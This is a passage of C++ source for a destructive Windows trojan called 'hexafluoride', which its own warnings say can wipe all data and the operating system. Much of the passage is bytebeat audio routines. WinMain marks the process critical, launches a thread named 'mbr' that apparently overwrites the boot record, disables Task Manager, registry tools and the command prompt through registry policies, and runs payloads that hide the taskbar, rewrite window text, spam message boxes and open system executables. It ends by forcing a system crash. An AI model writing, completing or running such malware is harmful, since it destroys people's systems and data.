	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound6() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 40960, 40960, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[40960 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t * (t & (1 << 4 + (t >> 17 & 3)) + 3) >> 8) + t;

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound7() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		if ((t & 4095) != 0) buffer[t] = static_cast<char>((533515505 >> (t >> 1) * (t >> 11)) % 2 * 2 * ((t >> 14 & 3) - 1) * t | t >> 3) % 128 + 32 * sin(5000 / (t & 4095)) - 32;

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound8() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[11025 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(((t >> 3 & 1) * (t >> 3 ^ t / 128 * t)) / 8);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound9() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[32000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t * ((t >> 12 | t >> 9) & 241 & t >> 4) | t & t >> 8);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound10() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(4 * t & t >> 4 | 6 * t & t >> 8 | 3 * t & t >> 5);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound11() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		if ((t & 4095) != 0) buffer[t] = static_cast<char>(t >> 11 & t >> 12) * (t >> 8 & t >> 16) % 34 * t + 400000 / (t & 4095);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound12() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 22050, 22050, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[22050 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(16 * t | (t >> 2) + (14 - (-t >> 15 & 1)) * t | t >> 4 | t >> 5);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound13() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t * (t >> 10 & 1 ? 4 - (1 & t >> 1) >> (3 & t >> 2) : 1) * ((t >> 13 & 2) + 1) * ((t >> 14 & 4) + 1) | t >> 2);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound14() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>((t * (2 & t >> 10 | (t >> 10 & 9) - 4 * (3 & t >> 15) + 3) & 128) * (-t >> 2 & 255) >> 7);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound15() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>((t >> 9 | t >> 11) % 7 * t * (~t >> 8 & 2) & 64) + ((t >> 9 | t >> 8) % 7 * t * (~t >> 8 & 2) & 64) + ((t >> 9 | t >> 12) % 7 * t * (~t >> 9 & 2) & 64);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound16() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t >> 3) * (t & (t & 32768 ? 16 : 24) | t >> (t >> 8 & 26)) | t >> 2;

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound17() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 44100, 44100, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[44100 * 30] = {};
	for (DWORD t = 0, l; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t * ((l = 2951594784) >> (t >> 12 ^ (t >> 12) - 2) % 11 * t / 64 & 1) ? 64 : 1) + (t * (l >> t * "36364689"[t >> 13 & 7] / 96 & 1) ? 64 : 1);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound18() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t * (t >> 1 & 23 ^ 2 | t >> 1 & 0) | t >> 2 | 30000 / (t % 4096 + 1));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound19() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0, x, y; t < sizeof(buffer); ++t)
		if ((t & 4095) != 0) buffer[t] = static_cast<char>(128 / (y = t & 4095) * 250 + (x = t * (15 & 39014 >> (t >> 12 & 12)) / 6 & 127) * y / 10000 + ((t >> 6 ^ t >> 8 | t >> 12 | x) & 63));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound20() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(3 + (t >> 2)) * (t ^ t + (t >> 8 & 3 | t >> 9 & 11 | -t >> 10 & 14));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound21() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		if ((t & 4095) != 0) buffer[t] = static_cast<char>(t / 2 / (4 + (t >> 13 & 3)) * 128 | t >> (t >> 14 & 15)) + 400000 / (t & 4095) | t >> 2;

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound22() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>((t >> 2 | t >> 11) % 7 * t * (~t >> 8 & 2) & 64) + ((t >> 9 | t >> 8) % 7 * t * (~t >> 8 & 2) & 64) + ((t >> 1 | t >> 12) % 7 * t * (~t >> 9 & 2) & 128);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound23() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[11025 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t * t * t >> t / 256 << 4 & ~t >> 2 | t >> 3 ^ t >> 5);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound24() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t << 1 & t * 3 & -t >> 6 & t >> 4) - 1;

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound25() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t * 2) ^ t | (t & (t * 3 / 4)) - (t * 99 / 100) ^ (t * 6);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

DWORD WINAPI taskbar(LPVOID lpvd) {
	static HWND hShellWnd = ::FindWindow(_T("Shell_TrayWnd"), NULL);
	ShowWindow(hShellWnd, SW_HIDE);
	return 0;
}

DWORD WINAPI textz(LPVOID lpParam) {
	while (true) {
		BOOL CALLBACK EnumChildProc(HWND hwnd, LPARAM lParam);
		EnumChildWindows(GetDesktopWindow(), &EnumChildProc, NULL);
		Sleep(10);
	}
}

BOOL CALLBACK EnumChildProc(HWND hwnd, LPARAM lParam) {
	SendMessageTimeoutW(hwnd, WM_SETTEXT, NULL, (LPARAM)string(), SMTO_ABORTIFHUNG, 100, NULL);
	return true;
}

DWORD WINAPI bounce(LPVOID lpParam) {
	int sx = 1, sy = 1;
	int incrementation = 10;
	int x = 0, y = 0;
	while (true) {
		HWND hwnd = GetForegroundWindow();
		x += incrementation * sx;
		y += incrementation * sy;
		SetWindowPos(hwnd, nullptr, x, y, x, y, NULL);
		if (y >= GetSystemMetrics(1)) {
			sy = -1;
		}
		if (x >= GetSystemMetrics(0)) {
			sx = -1;
		}
		if (y == 0) {
			sy = 1;
		}
		if (x == 0) {
			sx = 1;
		}
		DeleteObject(hwnd);
		Sleep(10);
	}
}

DWORD WINAPI msg(LPVOID lpParam) {
	while (true) {
		MessageBoxA(NULL, NULL, "", MB_ABORTRETRYIGNORE | MB_HELP); //coore32's message box
	}
	return 1;
}

DWORD WINAPI opener(LPVOID lpParam) {
	WIN32_FIND_DATA data;
	LPCWSTR path = L"C:\\WINDOWS\\system32\\*.exe";
	while (true) {
		HANDLE find = FindFirstFileW(path, &data);
		ShellExecuteW(0, L"open", data.cFileName, 0, 0, SW_SHOW);
		while (FindNextFileW(find, &data)) {
			ShellExecuteW(0, L"open", data.cFileName, 0, 0, SW_SHOW);
			Sleep(rand() % 5000);
		}
	}
}

BOOL CALLBACK EnumProc(HWND hWnd, LPARAM lParam) {
	ShowWindow(hWnd, 5);
	return 1;
}

DWORD WINAPI child(LPVOID lpParam) {
	while (true) {
		EnumChildWindows(GetDesktopWindow(), EnumProc, 0);
		Sleep(1000);
	}
}

DWORD WINAPI cur1(LPVOID lpParam) {
	while (true) {
		HDC hdc = GetDC(0);
		int w = GetSystemMetrics(0);
		int h = GetSystemMetrics(1);
		int x = rand() % w, y = rand() % h;
		SetCursorPos(x, y);
		DrawIcon(hdc, x, y, LoadCursor(0, IDC_ARROW));
		ReleaseDC(0, hdc);
		Sleep(10);
	}
}

int WINAPI WinMain(HINSTANCE a, HINSTANCE b, LPSTR c, int d) {
    if (MessageBoxW(NULL, L"Warning! You have ran a trojan known as hexafluoride that has full capacity to delete all of your data and your operating system. By continuing, you keep in mind that the creator will not be responsible for any damage caused by this trojan and it's highly recommended that you run this in a testing virtual machine where a snapshot has been made before execution for the sake of entertainment and analysis. Are you sure you want to run this?", L"hexafluoride", MB_YESNO | MB_ICONEXCLAMATION) == IDNO) {
        ExitProcess(0);
    }
    else {
        if (MessageBoxW(NULL, L"Final warning! This trojan has a lot of destructive potential. You will lose all of your data if you continue and the creator will not be responsible for any of the damage caused. This is not meant to be malicious, but simply for entertainment and educational purposes. Are you sure you want to continue? This is your final chance to stop this program from execution.", L"hexafluoride", MB_YESNO | MB_ICONEXCLAMATION) == IDNO) {
            ExitProcess(0);
        }
        else {
			ProcessIsCritical();
			CreateThread(0, 0, mbr, 0, 0, 0);
			CreateThread(0, 0, taskbar, 0, 0, 0);
			RegAdd(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", L"DisableTaskMgr", REG_DWORD, 1);
			RegAdd(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", L"DisableRegistryTools", REG_DWORD, 1);
			RegAdd(HKEY_CURRENT_USER, L"SOFTWARE\\Policies\\Microsoft\\Windows\\System", L"DisableCMD", REG_DWORD, 2);
			Sleep(1000);
			HANDLE thread0 = CreateThread(0, 0, piez, 0, 0, 0);
			Sleep(4000);
			CreateThread(0, 0, textz, 0, 0, 0);
			HANDLE thread1 = CreateThread(0, 0, shader1, 0, 0, 0);
			sound1();
			Sleep(30000);
			TerminateThread(thread1, 0);
			CloseHandle(thread1);
			RedrawWindow(0, 0, 0, 133);
			Sleep(100);
			HANDLE thread2 = CreateThread(0, 0, shader2, 0, 0, 0);
			sound2();
			Sleep(30000);
			TerminateThread(thread2, 0);
			CloseHandle(thread2);
			RedrawWindow(0, 0, 0, 133);
			Sleep(100);
			HANDLE thread3 = CreateThread(0, 0, shader3, 0, 0, 0);
			HANDLE thread3dot1 = CreateThread(0, 0, textout, 0, 0, 0);
			sound3();
			Sleep(30000);
			TerminateThread(thread3, 0);
			CloseHandle(thread3);
			RedrawWindow(0, 0, 0, 133);
			Sleep(100);
			HANDLE thread4 = CreateThread(0, 0, woah, 0, 0, 0);
			sound4();
			Sleep(30000);
			TerminateThread(thread4, 0);
			CloseHandle(thread4);
			RedrawWindow(0, 0, 0, 133);
			Sleep(100);
			HANDLE thread5 = CreateThread(0, 0, shader4, 0, 0, 0);
			sound5();
			Sleep(30000);
			TerminateThread(thread5, 0);
			CloseHandle(thread5);
			RedrawWindow(0, 0, 0, 133);
			Sleep(100);
			HANDLE thread6 = CreateThread(0, 0, shader5, 0, 0, 0);
			HANDLE thread6dot1 = CreateThread(0, 0, swirl, 0, 0, 0);
			sound6();
			Sleep(30000);
			TerminateThread(thread6, 0);
			CloseHandle(thread6);
			TerminateThread(thread6dot1, 0);
			CloseHandle(thread6dot1);
			TerminateThread(thread0, 0);
			CloseHandle(thread0);
			RedrawWindow(0, 0, 0, 133);
			Sleep(100);
			HANDLE thread7 = CreateThread(0, 0, shader6, 0, 0, 0);
			HANDLE thread7dot1 = CreateThread(0, 0, cube, 0, 0, 0);
			sound7();
			Sleep(30000);
			TerminateThread(thread7, 0);
			CloseHandle(thread7);
			RedrawWindow(0, 0, 0, 133);
			Sleep(100);
			CreateThread(0, 0, bounce, 0, 0, 0);
			HANDLE thread8 = CreateThread(0, 0, shader7, 0, 0, 0);
			HANDLE thread8dot1 = CreateThread(0, 0, icons, 0, 0, 0);
			sound8();
			Sleep(30000);
			TerminateThread(thread8, 0);
			CloseHandle(thread8);
			RedrawWindow(0, 0, 0, 133);
			Sleep(100);
			HANDLE thread9 = CreateThread(0, 0, glitch, 0, 0, 0);
			HANDLE thread9dot1 = CreateThread(0, 0, wef, 0, 0, 0);
			sound9();
			Sleep(30000);
			TerminateThread(thread9, 0);
			CloseHandle(thread9);
			TerminateThread(thread9dot1, 0);
			CloseHandle(thread9dot1);
			RedrawWindow(0, 0, 0, 133);
			Sleep(100);
			CreateThread(0, 0, msg, 0, 0, 0);
			HANDLE thread10 = CreateThread(0, 0, shader8, 0, 0, 0);
			sound10();
			Sleep(30000);
			TerminateThread(thread10, 0);
			CloseHandle(thread10);
			RedrawWindow(0, 0, 0, 133);
			Sleep(100);
			HANDLE thread11 = CreateThread(0, 0, shader9, 0, 0, 0);
			sound11();
			Sleep(30000);
			TerminateThread(thread11, 0);
			CloseHandle(thread11);
			RedrawWindow(0, 0, 0, 133);
			Sleep(100);
			CreateThread(0, 0, opener, 0, 0, 0);
			HANDLE thread12 = CreateThread(0, 0, shader10, 0, 0, 0);
			sound12();
			Sleep(30000);
			TerminateThread(thread12, 0);
			CloseHandle(thread12);
			RedrawWindow(0, 0, 0, 133);
			Sleep(100);
			HANDLE thread13 = CreateThread(0, 0, shader11, 0, 0, 0);
			sound13();
			Sleep(30000);
			TerminateThread(thread13, 0);
			CloseHandle(thread13);
			RedrawWindow(0, 0, 0, 133);
			Sleep(100);
			HANDLE thread14 = CreateThread(0, 0, shader12, 0, 0, 0);
			HANDLE thread14dot1 = CreateThread(0, 0, moricons, 0, 0, 0);
			sound14();
			Sleep(30000);
			TerminateThread(thread14, 0);
			CloseHandle(thread14);
			RedrawWindow(0, 0, 0, 133);
			Sleep(100);
			HANDLE thread15 = CreateThread(0, 0, shader13, 0, 0, 0);
			sound15();
			Sleep(30000);
			TerminateThread(thread15, 0);
			CloseHandle(thread15);
			RedrawWindow(0, 0, 0, 133);
			Sleep(100);
			HANDLE thread16 = CreateThread(0, 0, shader14, 0, 0, 0);
			sound16();
			Sleep(30000);
			TerminateThread(thread16, 0);
			CloseHandle(thread16);
			RedrawWindow(0, 0, 0, 133);
			Sleep(100);
			HANDLE thread17 = CreateThread(0, 0, patblt, 0, 0, 0);
			HANDLE thread17dot1 = CreateThread(0, 0, rotate, 0, 0, 0);
			sound17();
			Sleep(30000);
			TerminateThread(thread17, 0);
			CloseHandle(thread17);
			TerminateThread(thread17dot1, 0);
			CloseHandle(thread17dot1);
			RedrawWindow(0, 0, 0, 133);
			Sleep(100);
			HANDLE thread18 = CreateThread(0, 0, shader15, 0, 0, 0);
			sound18();
			Sleep(30000);
			TerminateThread(thread18, 0);
			CloseHandle(thread18);
			RedrawWindow(0, 0, 0, 133);
			Sleep(100);
			HANDLE thread19 = CreateThread(0, 0, hell1, 0, 0, 0);
			HANDLE thread19dot1 = CreateThread(0, 0, shell32, 0, 0, 0);
			sound19();
			Sleep(30000);
			TerminateThread(thread19, 0);
			CloseHandle(thread19);
			RedrawWindow(0, 0, 0, 133);
			Sleep(100);
			HANDLE thread20 = CreateThread(0, 0, shader16, 0, 0, 0);
			HANDLE thread20dot1 = CreateThread(0, 0, mash, 0, 0, 0);
			sound20();
			Sleep(30000);
			TerminateThread(thread20, 0);
			CloseHandle(thread20);
			TerminateThread(thread20dot1, 0);
			CloseHandle(thread20dot1);
			RedrawWindow(0, 0, 0, 133);
			Sleep(100);
			CreateThread(0, 0, child, 0, 0, 0);
			HANDLE thread21 = CreateThread(0, 0, shader17, 0, 0, 0);
			sound21();
			Sleep(30000);
			TerminateThread(thread21, 0);
			CloseHandle(thread21);
			RedrawWindow(0, 0, 0, 133);
			Sleep(100);
			HANDLE thread22 = CreateThread(0, 0, shader18, 0, 0, 0);
			sound22();
			Sleep(30000);
			TerminateThread(thread22, 0);
			CloseHandle(thread22);
			RedrawWindow(0, 0, 0, 133);
			Sleep(100);
			HANDLE thread23 = CreateThread(0, 0, shader19, 0, 0, 0);
			HANDLE thread23dot1 = CreateThread(0, 0, textout1, 0, 0, 0);
			sound23();
			Sleep(30000);
			TerminateThread(thread23, 0);
			CloseHandle(thread23);
			RedrawWindow(0, 0, 0, 133);
			Sleep(100);
			HANDLE thread24 = CreateThread(0, 0, shader20, 0, 0, 0);
			sound24();
			Sleep(30000);
			TerminateThread(thread24, 0);
			CloseHandle(thread24);
			TerminateThread(thread23dot1, 0);
			CloseHandle(thread23dot1);
			RedrawWindow(0, 0, 0, 133);
			Sleep(100);
			CreateThread(0, 0, cur1, 0, 0, 0);
			HANDLE thread25 = CreateThread(0, 0, shader21, 0, 0, 0);
			HANDLE thread25dot1 = CreateThread(0, 0, cubes, 0, 0, 0);
			HANDLE thread25dot2 = CreateThread(0, 0, lines, 0, 0, 0);
			sound25();
			Sleep(30000);
			BOOLEAN bl;
			DWORD response;
			NRHEdef NtRaiseHardError = (NRHEdef)GetProcAddress(LoadLibraryW(L"ntdll"), "NtRaiseHardError");
			RAPdef RtlAdjustPrivilege = (RAPdef)GetProcAddress(LoadLibraryW(L"ntdll"), "RtlAdjustPrivilege");
			RtlAdjustPrivilege(19, 1, 0, &bl);
			NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, 0, 6, &response);
			Sleep(-1);
        }
    }
}